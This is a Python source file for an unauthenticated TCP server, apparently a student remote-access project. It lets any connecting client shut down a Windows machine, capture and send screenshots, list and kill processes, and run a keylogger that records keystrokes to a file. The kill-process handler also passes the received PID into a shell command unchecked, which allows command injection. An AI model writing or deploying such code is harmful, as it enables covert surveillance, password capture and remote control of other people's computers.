from concurrent.futures import thread
import socket
import threading
import os
import pyautogui
import time
from pynput import keyboard

# Commands
CMD_SHUTDOWN = 'shutdown'
CMD_TAKE_SCREENSHOT = 'screenshot'
CMD_VIEW_PROCESSES = 'view_processes'
CMD_KILL_PROCESS = 'kill_process'
CMD_START_KEYLOGGER = 'start_keylogger'
CMD_STOP_KEYLOGGER = 'stop_keylogger'

# BUFFER
BUFFER_SIZE = 1024

# SCREENSHOT
TMP_PATH = os.path.join(os.getcwd(), 'server/tmp')


class Server:
  def __init__(self):
    self.host = socket.gethostbyname_ex(socket.gethostname())[2][2]
    self.port = 5000
    self.addr = (self.host, self.port)
    self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.server.bind(self.addr)
    self.keylogger_listener = None

  def run(self):
    self.server.listen(5)
    print(f'Server is listening on {self.host}:{self.port}')
    while True:
      conn, addr = self.server.accept()
      thread = threading.Thread(target=self.handle_client, args=(conn, addr))
      thread.start()
      print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")

  # Handle client connection
  def handle_client(self, conn, addr):
    print(f"[NEW CONNECTION] {addr} connected.")
    connected = True
    while connected:
      data = conn.recv(BUFFER_SIZE)

      if data == CMD_SHUTDOWN.encode():
        self.shutdown(conn, addr)

      elif data == CMD_TAKE_SCREENSHOT.encode():
        self.take_screenshot()
        self.send_image(os.path.join(TMP_PATH, 'screenshot.png'), conn)

      elif data == CMD_VIEW_PROCESSES.encode():
        processes = self.get_all_processes()
        conn.send(processes.encode())
        time.sleep(0.01)
        conn.send(b'PROCESSES_END')

      elif data == CMD_KILL_PROCESS.encode():
        pid = conn.recv(BUFFER_SIZE).decode()
        self.kill_process(pid)

      elif data == CMD_START_KEYLOGGER.encode():
        print('Starting keylogger')
        self.start_keylogger()

      elif data == CMD_STOP_KEYLOGGER.encode():
        print('Stopping keylogger')
        self.stop_keylogger()
        

    conn.close()
    print(f"[DISCONNECTED] {addr} disconnected.")

  def shutdown(self, conn, addr):
    print(f"[SHUTDOWN] {addr} disconnected.")
    print(f'Received shutdown command. Server is shutting down.')
    conn.close()
    os.system('shutdown -s -t 0')
    
  def take_screenshot(self):
    screenshot = pyautogui.screenshot()
    screenshot.save(os.path.join(TMP_PATH, 'screenshot.png'))
  
  def send_image(self, path, conn):
    if os.path.exists(path):
      f = open(path, 'rb')
      bytes = f.read(BUFFER_SIZE)
      while bytes:
        conn.send(bytes)
        bytes = f.read(BUFFER_SIZE)
      time.sleep(0.05)
      f.close()
      conn.send(b'IMAGE_END')

  def get_all_processes(self):
    return os.popen('wmic process get description, processid, threadcount').read()

  def kill_process(self, pid):
    # os.system(f'TASKKILL /f /t /PID {pid}')
    os.popen('wmic process where processid=' + pid + ' call terminate')

  def on_press(self, key):
      with open(os.path.join(TMP_PATH, 'keylog.txt'), 'a') as f:
      # Special charactersa
        if key == keyboard.Key.enter:
          key = '\n'
        if key == keyboard.Key.space:
          key = ' '
        if key == keyboard.Key.tab:
          key = '\t'
        if key == keyboard.Key.shift:
          key = '<shift>'
        if key == keyboard.Key.backspace:
          key = '<backspace>'
        if key == keyboard.Key.esc:
          key = '<esc>'
        if key == keyboard.Key.ctrl:
          key = '<ctrl>'

        key = str(key).replace("'", '')

        f.write(str(key))

  def start_keylogger(self):
    self.keylogger_listener = keyboard.Listener(on_press=self.on_press)
    self.keylogger_listener.start()
   
  def stop_keylogger(self):
    self.keylogger_listener.stop()

if __name__ == '__main__':
  server = Server()
  server.run()